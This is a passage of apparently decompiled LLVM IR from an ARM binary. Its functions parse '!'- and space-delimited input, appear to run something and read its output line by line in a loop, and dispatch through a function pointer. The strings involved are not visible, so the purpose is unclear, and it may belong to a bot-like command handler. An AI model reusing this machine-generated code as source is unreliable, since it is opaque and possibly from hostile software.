  %v3_b2bc.pre-phi = phi i8* [ %.pre24, %dec_label_pc_b274.dec_label_pc_b2a8_crit_edge ], [ %v1_b29c, %dec_label_pc_b28c ]
  %v2_b2b4.pre-phi = phi i32 [ %.pre, %dec_label_pc_b274.dec_label_pc_b2a8_crit_edge ], [ %v2_b298, %dec_label_pc_b28c ]
  store i8 0, i8* %v3_b2bc.pre-phi, align 1
  %v1_b2d8 = add i32 %v2_b2b4.pre-phi, 2
  %v5_b2dc = inttoptr i32 %v1_b2d8 to i8*
  br label %dec_label_pc_b2f8

dec_label_pc_b2ec:                                ; preds = %dec_label_pc_b310
  %v1_b2f0 = add i32 %storemerge9, 1
  br label %dec_label_pc_b2f8

dec_label_pc_b2f8:                                ; preds = %dec_label_pc_b2a8, %dec_label_pc_b2ec
  %storemerge9 = phi i32 [ 0, %dec_label_pc_b2a8 ], [ %v1_b2f0, %dec_label_pc_b2ec ]
  store i32 %storemerge9, i32* @r4, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_b300 = call i32 @function_f2e0()
  store i32 %v0_b300, i32* %r0.global-to-local, align 4
  %v0_b308 = load i32, i32* @r4, align 4
  %v3_b308 = icmp ult i32 %v0_b308, %v0_b300
  br i1 %v3_b308, label %dec_label_pc_b310, label %dec_label_pc_b2f8.dec_label_pc_b32c_crit_edge

dec_label_pc_b2f8.dec_label_pc_b32c_crit_edge:    ; preds = %dec_label_pc_b2f8
  %.pre25 = add i32 %storemerge9, %arg2
  %.pre26 = inttoptr i32 %.pre25 to i8*
  br label %dec_label_pc_b32c

dec_label_pc_b310:                                ; preds = %dec_label_pc_b2f8
  %v2_b31c = add i32 %storemerge9, %arg2
  %v1_b320 = inttoptr i32 %v2_b31c to i8*
  %v2_b320 = load i8, i8* %v1_b320, align 1
  %v7_b324 = icmp eq i8 %v2_b320, 33
  br i1 %v7_b324, label %dec_label_pc_b32c, label %dec_label_pc_b2ec

dec_label_pc_b32c:                                ; preds = %dec_label_pc_b310, %dec_label_pc_b2f8.dec_label_pc_b32c_crit_edge
  %v3_b340.pre-phi = phi i8* [ %.pre26, %dec_label_pc_b2f8.dec_label_pc_b32c_crit_edge ], [ %v1_b320, %dec_label_pc_b310 ]
  store i8 0, i8* %v3_b340.pre-phi, align 1
  %v2_b348 = load i8, i8* %v5_b2dc, align 1
  %v7_b34c = icmp eq i8 %v2_b348, 33
  br i1 %v7_b34c, label %dec_label_pc_b354, label %dec_label_pc_b8f8

dec_label_pc_b354:                                ; preds = %dec_label_pc_b32c
  %v2_b358 = load i32, i32* @global_var_25718.173, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_b364 = inttoptr i32 %arg3 to i8*
  %v3_b364 = call i32 @function_f664(i8* %v2_b364, i32 %v2_b358)
  store i32 %v3_b364, i32* %r0.global-to-local, align 4
  %v2_b36c = icmp eq i32 %v3_b364, 0
  br i1 %v2_b36c, label %dec_label_pc_b374, label %dec_label_pc_b8f8

dec_label_pc_b374:                                ; preds = %dec_label_pc_b354
  %v2_b37c = ptrtoint i32* %stack_var_-1120 to i32
  store i32 1024, i32* @r2, align 4
  store i32 %v2_b37c, i32* %r0.global-to-local, align 4
  %v2_b38c = bitcast i32* %stack_var_-1120 to i8*
  %v3_b38c = call i32 @function_f240(i8* %v2_b38c, i32 0)
  store i32 %v3_b38c, i32* %r0.global-to-local, align 4
  %v1_b39c = add i32 %v2_b2b4.pre-phi, 3
  %v5_b3a0 = inttoptr i32 %v1_b39c to i8*
  br label %dec_label_pc_b3bc

dec_label_pc_b3b0:                                ; preds = %dec_label_pc_b3d4
  %v1_b3b4 = add i32 %storemerge10, 1
  br label %dec_label_pc_b3bc

dec_label_pc_b3bc:                                ; preds = %dec_label_pc_b374, %dec_label_pc_b3b0
  %storemerge10 = phi i32 [ 0, %dec_label_pc_b374 ], [ %v1_b3b4, %dec_label_pc_b3b0 ]
  store i32 %storemerge10, i32* @r4, align 4
  store i32 %v1_b39c, i32* @r0, align 4
  %v0_b3c4 = call i32 @function_f2e0()
  store i32 %v0_b3c4, i32* %r0.global-to-local, align 4
  %v0_b3cc = load i32, i32* @r4, align 4
  %v3_b3cc = icmp ult i32 %v0_b3cc, %v0_b3c4
  br i1 %v3_b3cc, label %dec_label_pc_b3d4, label %dec_label_pc_b3bc.dec_label_pc_b3f0_crit_edge

dec_label_pc_b3bc.dec_label_pc_b3f0_crit_edge:    ; preds = %dec_label_pc_b3bc
  %.pre27 = add i32 %storemerge10, %v1_b39c
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_b3f0

dec_label_pc_b3d4:                                ; preds = %dec_label_pc_b3bc
  %v2_b3e0 = add i32 %storemerge10, %v1_b39c
  %v1_b3e4 = inttoptr i32 %v2_b3e0 to i8*
  %v2_b3e4 = load i8, i8* %v1_b3e4, align 1
  %v7_b3e8 = icmp eq i8 %v2_b3e4, 32
  br i1 %v7_b3e8, label %dec_label_pc_b3f0, label %dec_label_pc_b3b0

dec_label_pc_b3f0:                                ; preds = %dec_label_pc_b3d4, %dec_label_pc_b3bc.dec_label_pc_b3f0_crit_edge
  %v3_b404.pre-phi = phi i8* [ %.pre28, %dec_label_pc_b3bc.dec_label_pc_b3f0_crit_edge ], [ %v1_b3e4, %dec_label_pc_b3d4 ]
  store i8 0, i8* %v3_b404.pre-phi, align 1
  %v2_b40c = load i32, i32* @global_var_25604.175, align 4
  store i32 %v1_b39c, i32* %r0.global-to-local, align 4
  %v3_b418 = call i32 @function_81ec(i8* %v5_b3a0, i32 %v2_b40c)
  store i32 %v3_b418, i32* %r0.global-to-local, align 4
  %v2_b420 = icmp eq i32 %v3_b418, 0
  br i1 %v2_b420, label %dec_label_pc_b428, label %dec_label_pc_b8f8

dec_label_pc_b428:                                ; preds = %dec_label_pc_b3f0
  %v1_b42c = add i32 %v2_b2b4.pre-phi, 4
  %v2_b434 = add i32 %v1_b42c, %storemerge10
  %v5_b438 = inttoptr i32 %v2_b434 to i8*
  store i32 %v2_b434, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19284.177 to i32), i32* @r1, align 4
  %v5_b448 = call i32 @function_f42c(i8* %v5_b438, i32 ptrtoint ([5 x i8]* @global_var_19284.177 to i32), i32 4)
  store i32 %v5_b448, i32* %r0.global-to-local, align 4
  %v2_b450 = icmp eq i32 %v5_b448, 0
  br i1 %v2_b450, label %dec_label_pc_b458, label %dec_label_pc_b494

dec_label_pc_b458:                                ; preds = %dec_label_pc_b428
  %v2_b45c = load i8, i8* bitcast (i8** @global_var_22ea4.8 to i8*), align 4
  %v2_b460 = icmp eq i8 %v2_b45c, 0
  br i1 %v2_b460, label %dec_label_pc_b47c, label %dec_label_pc_b468

dec_label_pc_b468:                                ; preds = %dec_label_pc_b458
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_b474 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_18530.12 to i32))
  store i32 %v3_b474, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b494

dec_label_pc_b47c:                                ; preds = %dec_label_pc_b458
  %v1_b480 = add i32 %v2_b434, 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v1_b480, i32* @r2, align 4
  %v3_b490 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_1928c.181 to i32))
  store i32 %v3_b490, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b494

dec_label_pc_b494:                                ; preds = %dec_label_pc_b428, %dec_label_pc_b468, %dec_label_pc_b47c
  store i32 %v2_b434, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19290.183 to i32), i32* @r1, align 4
  %v5_b4a0 = call i32 @function_f42c(i8* %v5_b438, i32 ptrtoint ([4 x i8]* @global_var_19290.183 to i32), i32 3)
  store i32 %v5_b4a0, i32* %r0.global-to-local, align 4
  %v2_b4a8 = icmp eq i32 %v5_b4a0, 0
  br i1 %v2_b4a8, label %dec_label_pc_b4b0, label %dec_label_pc_b5a4

dec_label_pc_b4b0:                                ; preds = %dec_label_pc_b494
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_b4b4 = call i32 @function_8400(i32 %arg2)
  store i32 %v1_b4b4, i32* %r0.global-to-local, align 4
  %v2_b4bc = icmp eq i32 %v1_b4b4, 0
  br i1 %v2_b4bc, label %dec_label_pc_b4c4, label %dec_label_pc_b8f8

dec_label_pc_b4c4:                                ; preds = %dec_label_pc_b4b0
  %v2_b4cc = ptrtoint i32* %stack_var_-2144 to i32
  store i32 %v2_b4cc, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_b4dc = bitcast i32* %stack_var_-2144 to i8*
  %v3_b4dc = call i32 @function_f240(i8* %v2_b4dc, i32 0)
  %v1_b4e4 = add i32 %v2_b434, 3
  store i32 %v2_b4cc, i32* @r0, align 4
  %v5_b4fc = call i32 @function_d01c(i32 %v2_b4cc, i32 ptrtoint ([60 x i8]* @global_var_19294.185 to i32), i32 %v1_b4e4, i32 %v2_b4cc)
  store i32 %v2_b4cc, i32* %r0.global-to-local, align 4
  %v3_b514 = call i32 @function_d23c(i32 %v2_b4cc, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_18560.25, i32 0, i32 0))
  store i32 %v3_b514, i32* %r0.global-to-local, align 4
  %v1_b584 = inttoptr i32 %v3_b514 to i16*
  %v2_b58421 = call i32 @function_e9c0(i16* %v1_b584)
  store i32 %v2_b58421, i32* %r0.global-to-local, align 4
  %v2_b58c23 = icmp eq i32 %v2_b58421, 0
  br i1 %v2_b58c23, label %dec_label_pc_b524, label %dec_label_pc_b594

dec_label_pc_b524:                                ; preds = %dec_label_pc_b4c4, %dec_label_pc_b524
  store i32 %v2_b4cc, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v3_b53c = call i32 @function_f240(i8* %v2_b4dc, i32 0)
  store i32 %v2_b4cc, i32* %r0.global-to-local, align 4
  %v3_b558 = call i32 @function_ea64(i32 %v2_b4cc, i32 1024, i32 %v3_b514)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_b574 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_192d0.188 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_b57c = call i32 @function_11544(i32 1)
  store i32 %v3_b514, i32* %r0.global-to-local, align 4
  %v2_b584 = call i32 @function_e9c0(i16* %v1_b584)
  store i32 %v2_b584, i32* %r0.global-to-local, align 4
  %v2_b58c = icmp eq i32 %v2_b584, 0
  br i1 %v2_b58c, label %dec_label_pc_b524, label %dec_label_pc_b594

dec_label_pc_b594:                                ; preds = %dec_label_pc_b524, %dec_label_pc_b4c4
  store i32 %v3_b514, i32* %r0.global-to-local, align 4
  %v1_b598 = call i32 @function_d104(i32 %v3_b514)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_b5a0 = call i32 @function_1148c(i32 0)
  store i32 %v1_b5a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5a4

dec_label_pc_b5a4:                                ; preds = %dec_label_pc_b494, %dec_label_pc_b594
  store i32 %v2_b434, i32* @r0, align 4
  %v0_b5a8 = call i32 @function_f2e0()
  store i32 %v0_b5a8, i32* %r0.global-to-local, align 4
  %v2_b5f4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_b5f8 = add i32 %v2_b5f4, -1096
  br label %dec_label_pc_b620

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b620
  %v2_b5c4 = load i8, i8* %stack_var_-40.0, align 1
  %v7_b5c8 = icmp eq i8 %v2_b5c4, 32
  br i1 %v7_b5c8, label %dec_label_pc_b670, label %dec_label_pc_b5d0

dec_label_pc_b5d0:                                ; preds = %dec_label_pc_b5c0
  %v2_b5d4 = load i8, i8* %stack_var_-40.0, align 1
  %v2_b5d8 = icmp eq i8 %v2_b5d4, 0
  br i1 %v2_b5d8, label %dec_label_pc_b670, label %dec_label_pc_b5e0

dec_label_pc_b5e0:                                ; preds = %dec_label_pc_b5d0
  %v2_b5e8 = load i8, i8* %stack_var_-40.0, align 1
  store i32 %v2_b5f4, i32* %r0.global-to-local, align 4
  %v2_b5fc = add i32 %v2_b5f8, %storemerge11
  %v3_b604 = inttoptr i32 %v2_b5fc to i8*
  store i8 %v2_b5e8, i8* %v3_b604, align 1
  %v1_b60c = add i32 %v4_b5c0, 1
  %v5_b610 = inttoptr i32 %v1_b60c to i8*
  %v1_b618 = add nuw i32 %storemerge11, 1
  br label %dec_label_pc_b620

dec_label_pc_b620:                                ; preds = %dec_label_pc_b5a4, %dec_label_pc_b5e0
  %stack_var_-40.0 = phi i8* [ %v5_b438, %dec_label_pc_b5a4 ], [ %v5_b610, %dec_label_pc_b5e0 ]
  %storemerge11 = phi i32 [ 0, %dec_label_pc_b5a4 ], [ %v1_b618, %dec_label_pc_b5e0 ]
  %v5_b62c = icmp slt i32 %storemerge11, %v0_b5a8
  %v4_b5c0 = ptrtoint i8* %stack_var_-40.0 to i32
  br i1 %v5_b62c, label %dec_label_pc_b5c0, label %dec_label_pc_b670

dec_label_pc_b63c:                                ; preds = %dec_label_pc_b670
  %v2_b648 = add i32 %storemerge12, %v4_b5c0
  %v1_b64c = inttoptr i32 %v2_b648 to i8*
  %v2_b64c = load i8, i8* %v1_b64c, align 1
  %v7_b650 = icmp eq i8 %v2_b64c, 32
  br i1 %v7_b650, label %dec_label_pc_b658, label %dec_label_pc_b664

dec_label_pc_b658:                                ; preds = %dec_label_pc_b63c
  %v1_b65c = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_b664

dec_label_pc_b664:                                ; preds = %dec_label_pc_b63c, %dec_label_pc_b658
  %stack_var_-36.0 = phi i32 [ %v1_b65c, %dec_label_pc_b658 ], [ %stack_var_-36.1, %dec_label_pc_b63c ]
  %v1_b668 = add i32 %storemerge12, 1
  br label %dec_label_pc_b670

dec_label_pc_b670:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b5d0, %dec_label_pc_b620, %dec_label_pc_b664
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_b664 ], [ 0, %dec_label_pc_b620 ], [ 0, %dec_label_pc_b5d0 ], [ 0, %dec_label_pc_b5c0 ]
  %storemerge12 = phi i32 [ %v1_b668, %dec_label_pc_b664 ], [ 0, %dec_label_pc_b620 ], [ 0, %dec_label_pc_b5d0 ], [ 0, %dec_label_pc_b5c0 ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %v4_b5c0, i32* @r0, align 4
  %v0_b678 = call i32 @function_f2e0()
  store i32 %v0_b678, i32* %r0.global-to-local, align 4
  %v0_b680 = load i32, i32* @r4, align 4
  %v3_b680 = icmp ult i32 %v0_b680, %v0_b678
  br i1 %v3_b680, label %dec_label_pc_b63c, label %dec_label_pc_b688

dec_label_pc_b688:                                ; preds = %dec_label_pc_b670
  %v1_b68c = add i32 %stack_var_-36.1, 1
  %v7_b69c = icmp slt i32 %v1_b68c, 11
  br i1 %v7_b69c, label %dec_label_pc_b6a8, label %dec_label_pc_b6a0

dec_label_pc_b6a0:                                ; preds = %dec_label_pc_b688
  br label %dec_label_pc_b6a8

dec_label_pc_b6a8:                                ; preds = %dec_label_pc_b688, %dec_label_pc_b6a0
  %stack_var_-36.2 = phi i32 [ %v1_b68c, %dec_label_pc_b688 ], [ 10, %dec_label_pc_b6a0 ]
  %tmp = mul i32 %stack_var_-36.2, 4
  %v3_b6c4 = add i32 %tmp, 4
  %v2_b6cc = add i32 %v2_b5f4, -72
  %v2_b6d0 = add i32 %v2_b6cc, %v3_b6c4
  %v2_b6d8 = inttoptr i32 %v2_b6d0 to i32*
  store i32 ptrtoint (i32* @global_var_192e0.190 to i32), i32* %v2_b6d8, align 4
  %v2_b80016 = load i8, i8* %stack_var_-40.0, align 1
  %v2_b80418 = icmp eq i8 %v2_b80016, 0
  br i1 %v2_b80418, label %dec_label_pc_b80c, label %dec_label_pc_b6e8

dec_label_pc_b6e8:                                ; preds = %dec_label_pc_b6a8, %dec_label_pc_b750
  %v4_b7fc20 = phi i32 [ %v2_b7f4.pre-phi, %dec_label_pc_b750 ], [ %v4_b5c0, %dec_label_pc_b6a8 ]
  %stack_var_-32.019 = phi i32 [ %v1_b7e0, %dec_label_pc_b750 ], [ 1, %dec_label_pc_b6a8 ]
  %v1_b6ec = add i32 %v4_b7fc20, 1
  %v6_b700 = icmp slt i32 %stack_var_-32.019, %stack_var_-36.2
  br i1 %v6_b700, label %dec_label_pc_b71c, label %dec_label_pc_b80c

dec_label_pc_b710:                                ; preds = %dec_label_pc_b734
  %v1_b714 = add i32 %storemerge14, 1
  br label %dec_label_pc_b71c

dec_label_pc_b71c:                                ; preds = %dec_label_pc_b6e8, %dec_label_pc_b710
  %storemerge14 = phi i32 [ %v1_b714, %dec_label_pc_b710 ], [ 0, %dec_label_pc_b6e8 ]
  store i32 %v1_b6ec, i32* @r0, align 4
  %v0_b724 = call i32 @function_f2e0()
  store i32 %v0_b724, i32* %r0.global-to-local, align 4
  %v3_b72c = icmp ult i32 %storemerge14, %v0_b724
  br i1 %v3_b72c, label %dec_label_pc_b734, label %dec_label_pc_b71c.dec_label_pc_b750_crit_edge

dec_label_pc_b71c.dec_label_pc_b750_crit_edge:    ; preds = %dec_label_pc_b71c
  %.pre30 = add i32 %storemerge14, %v1_b6ec
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_b750

dec_label_pc_b734:                                ; preds = %dec_label_pc_b71c
  %v2_b740 = add i32 %storemerge14, %v1_b6ec
  %v1_b744 = inttoptr i32 %v2_b740 to i8*
  %v2_b744 = load i8, i8* %v1_b744, align 1
  %v7_b748 = icmp eq i8 %v2_b744, 32
  br i1 %v7_b748, label %dec_label_pc_b750, label %dec_label_pc_b710

dec_label_pc_b750:                                ; preds = %dec_label_pc_b734, %dec_label_pc_b71c.dec_label_pc_b750_crit_edge
  %v5_b7f8.pre-phi = phi i8* [ %.pre31, %dec_label_pc_b71c.dec_label_pc_b750_crit_edge ], [ %v1_b744, %dec_label_pc_b734 ]
  %v2_b7f4.pre-phi = phi i32 [ %.pre30, %dec_label_pc_b71c.dec_label_pc_b750_crit_edge ], [ %v2_b740, %dec_label_pc_b734 ]
  store i32 %stack_var_-32.019, i32* @r4, align 4
  %v1_b758 = add i32 %storemerge14, 1
  store i32 %v1_b758, i32* %r0.global-to-local, align 4
  %v1_b760 = call i32 @function_fd60(i32 %v1_b758)
  %v0_b770 = load i32, i32* @r4, align 4
  %v3_b770 = mul i32 %v0_b770, 4
  store i32 %v2_b5f4, i32* %r0.global-to-local, align 4
  %v2_b77c = add i32 %v2_b6cc, %v3_b770
  %v2_b780 = inttoptr i32 %v2_b77c to i32*
  store i32 %v1_b760, i32* %v2_b780, align 4
  %v3_b78c = mul i32 %stack_var_-32.019, 4
  %v2_b798 = add i32 %v2_b6cc, %v3_b78c
  %v1_b79c = inttoptr i32 %v2_b798 to i32*
  %v2_b79c = load i32, i32* %v1_b79c, align 4
  store i32 %v2_b79c, i32* %r0.global-to-local, align 4
  store i32 %v1_b6ec, i32* @r1, align 4
  %v3_b7ac = call i32 @function_f560(i32 %v2_b79c, i32 %v1_b6ec, i32 %storemerge14)
  store i32 %v2_b5f4, i32* %r0.global-to-local, align 4
  %v2_b7c8 = load i32, i32* %v1_b79c, align 4
  %v2_b7d0 = add i32 %v2_b7c8, %storemerge14
  %v3_b7d8 = inttoptr i32 %v2_b7d0 to i8*
  store i8 0, i8* %v3_b7d8, align 1
  %v1_b7e0 = add nuw i32 %stack_var_-32.019, 1
  %v2_b800 = load i8, i8* %v5_b7f8.pre-phi, align 1
  %v2_b804 = icmp eq i8 %v2_b800, 0
  br i1 %v2_b804, label %dec_label_pc_b80c, label %dec_label_pc_b6e8

dec_label_pc_b80c:                                ; preds = %dec_label_pc_b750, %dec_label_pc_b6e8, %dec_label_pc_b6a8
  %v7_b8ec = load i32, i32* inttoptr (i32 142184 to i32*), align 8
  %v2_b8f0 = icmp eq i32 %v7_b8ec, 0
  br i1 %v2_b8f0, label %dec_label_pc_b8f8, label %dec_label_pc_b818

dec_label_pc_b818:                                ; preds = %dec_label_pc_b80c
  %v7_b820 = load i32, i32* inttoptr (i32 142184 to i32*), align 8
  store i32 %v7_b820, i32* %r0.global-to-local, align 4
  %v2_b838 = inttoptr i32 %v7_b820 to i8*
  %v3_b838 = call i32 @function_f664(i8* %v2_b838, i32 %v2_b37c)
  store i32 %v3_b838, i32* %r0.global-to-local, align 4
  %v2_b860 = load i32, i32* inttoptr (i32 142188 to i32*), align 4
  store i32 %v2_b860, i32* @r4, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 47240, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_b860)
  %v5_b8d070 = icmp sgt i32 %stack_var_-36.2, 1
  br i1 %v5_b8d070, label %dec_label_pc_b894, label %dec_label_pc_b8f8

dec_label_pc_b894:                                ; preds = %dec_label_pc_b818, %dec_label_pc_b894
  %storemerge1371 = phi i32 [ %v1_b8bc, %dec_label_pc_b894 ], [ 1, %dec_label_pc_b818 ]
  %v3_b89c = mul i32 %storemerge1371, 4
  %v2_b8a8 = add i32 %v2_b6cc, %v3_b89c
  %v1_b8ac = inttoptr i32 %v2_b8a8 to i32*
  %v2_b8ac = load i32, i32* %v1_b8ac, align 4
  store i32 %v2_b8ac, i32* @r0, align 4
  %v0_b8b4 = call i32 @function_108e4()
  store i32 %v0_b8b4, i32* %r0.global-to-local, align 4
  %v1_b8bc = add nuw nsw i32 %storemerge1371, 1
  %v5_b8d0 = icmp slt i32 %v1_b8bc, %stack_var_-36.2
  br i1 %v5_b8d0, label %dec_label_pc_b894, label %dec_label_pc_b8f8

dec_label_pc_b8f8:                                ; preds = %dec_label_pc_b818, %dec_label_pc_b894, %dec_label_pc_b80c, %dec_label_pc_b4b0, %dec_label_pc_b3f0, %dec_label_pc_b354, %dec_label_pc_b32c
  %v1_b900 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_b900

; uselistorder directives
  uselistorder i32 %v1_b8bc, { 1, 0 }
  uselistorder i32 %.pre30, { 1, 0 }
  uselistorder i32 %storemerge14, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i32 %v1_b6ec, { 2, 3, 0, 1, 4 }
  uselistorder i32 %stack_var_-32.019, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-36.2, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 0, 1 }
  uselistorder i32 %stack_var_-36.1, { 0, 2, 1 }
  uselistorder i32 %v4_b5c0, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge11, { 2, 0, 1 }
  uselistorder i8* %stack_var_-40.0, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v2_b5f4, { 2, 1, 0, 4, 3 }
  uselistorder i16* %v1_b584, { 1, 0 }
  uselistorder i32 %v3_b514, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_b4cc, { 1, 0, 2, 4, 3, 7, 6, 5, 8 }
  uselistorder i32 %v2_b434, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32 %storemerge10, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_b39c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %storemerge9, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge8, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 43, 2, 1, 5, 3, 4, 6, 7, 8, 9, 11, 10, 13, 14, 16, 15, 45, 21, 17, 18, 19, 20, 40, 39, 22, 23, 42, 24, 27, 25, 12, 26, 29, 28, 31, 30, 44, 32, 33, 35, 34, 41, 36, 37, 38, 0 }
  uselistorder i32 (i16*)* @function_e9c0, { 1, 0 }
  uselistorder [2 x i8]* @global_var_18560.25, { 1, 0 }
  uselistorder i32 (i32)* @function_8400, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i8* bitcast (i8** @global_var_22ea4.8 to i8*), { 5, 0, 4, 1, 3, 2 }
  uselistorder i32 (i8*, i32, i32)* @function_f42c, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32)* @function_81ec, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg3, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg2, { 3, 5, 4, 2, 0, 1, 6 }
  uselistorder i32 %arg1, { 2, 4, 3, 6, 5, 1, 0, 7 }
  uselistorder label %dec_label_pc_b8f8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_b894, { 1, 0 }
  uselistorder label %dec_label_pc_b71c, { 1, 0 }
  uselistorder label %dec_label_pc_b6e8, { 1, 0 }
  uselistorder label %dec_label_pc_b6a8, { 1, 0 }
  uselistorder label %dec_label_pc_b670, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_b664, { 1, 0 }
  uselistorder label %dec_label_pc_b620, { 1, 0 }
  uselistorder label %dec_label_pc_b5a4, { 1, 0 }
  uselistorder label %dec_label_pc_b524, { 1, 0 }
  uselistorder label %dec_label_pc_b494, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b3bc, { 1, 0 }
  uselistorder label %dec_label_pc_b2f8, { 1, 0 }
  uselistorder label %dec_label_pc_b274, { 1, 0 }
}

define i32 @function_b930(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b930:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_b930 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b930, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_b930
  %v1_b930 = load i32, i32* %r2.global-to-local, align 4
  %v2_b930 = load i32, i32* @r8, align 4
  %v3_b930 = udiv i32 %v2_b930, 4194304
  %v4_b930 = mul i32 %v2_b930, 1024
  %v5_b930 = or i32 %v3_b930, %v4_b930
  %v8_b930 = and i32 %v5_b930, %v1_b930
  store i32 %v8_b930, i32* %r2.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_b930, %bb
  store i32 47424, i32* %stack_var_-4, align 4
  %v2_b93c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b93c, i32* @fp, align 4
  %v2_b954 = load i32, i32* @global_var_25604.175, align 4
  store i32 %v2_b954, i32* @r2, align 4
  %v3_b964 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_192e4.194 to i32))
  %v2_b96c = load i32, i32* @global_var_25718.173, align 4
  store i32 %v2_b96c, i32* @r2, align 4
  %v3_b980 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_192f4.199 to i32))
  %v2_b988 = load i32, i32* @global_var_25604.175, align 4
  store i32 %v2_b988, i32* @r2, align 4
  %v3_b998 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_19304.201 to i32))
  ret i32 %v3_b998

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @function_b9c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b9c0:
  %stack_var_-4 = alloca i32, align 4
  store i32 47564, i32* %stack_var_-4, align 4
  %v2_b9c8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b9c8, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v3_b9e8 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1930c.203 to i32))
  ret i32 %v3_b9e8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_b9fc(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_b9fc:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-44 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 47624, i32* %stack_var_-4, align 4
  %v2_ba04 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ba04, i32* @fp, align 4
  br label %dec_label_pc_ba4c.preheader

dec_label_pc_ba34:                                ; preds = %dec_label_pc_ba64
  %v1_ba38 = add i32 %.pre, 1
  %v5_ba3c = inttoptr i32 %v1_ba38 to i8*
  %v1_ba44 = add i32 %stack_var_-40.0, 1
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba4c.preheader, %dec_label_pc_ba34
  %stack_var_-32.0 = phi i8* [ %v5_ba3c, %dec_label_pc_ba34 ], [ %stack_var_-32.118, %dec_label_pc_ba4c.preheader ]
  %stack_var_-40.0 = phi i32 [ %v1_ba44, %dec_label_pc_ba34 ], [ %stack_var_-40.119, %dec_label_pc_ba4c.preheader ]
  store i32 %tmp, i32* @r0, align 4
  %v0_ba54 = call i32 @function_f2e0()
  %v3_ba5c = icmp ult i32 %stack_var_-40.0, %v0_ba54
  %.pre = ptrtoint i8* %stack_var_-32.0 to i32
  br i1 %v3_ba5c, label %dec_label_pc_ba64, label %dec_label_pc_ba74

dec_label_pc_ba64:                                ; preds = %dec_label_pc_ba4c
  %v2_ba68 = load i8, i8* %stack_var_-32.0, align 1
  %v7_ba6c = icmp eq i8 %v2_ba68, 32
  br i1 %v7_ba6c, label %dec_label_pc_ba74, label %dec_label_pc_ba34

